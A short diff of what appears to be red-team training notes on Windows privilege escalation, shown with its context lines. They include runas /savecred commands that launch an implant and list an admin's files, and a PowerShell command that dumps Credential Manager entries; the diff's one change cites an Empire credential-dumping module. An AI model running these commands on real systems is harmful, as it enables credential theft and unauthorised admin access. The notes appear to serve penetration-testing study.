@@ -56,7 +56,7 @@ C:\> runas /savecred /user:admin c:\rto\lpe\implant\implant.exe
 C:\> runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\rto\admin.txt"
 ```
 
-- Rob Credential Manager
+- Rob Credential Manager using a custom script based on https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1
 
 ```
 C:\> powershell Import-Module c:\rto\lpe\cms.ps1 ; Enum-Creds
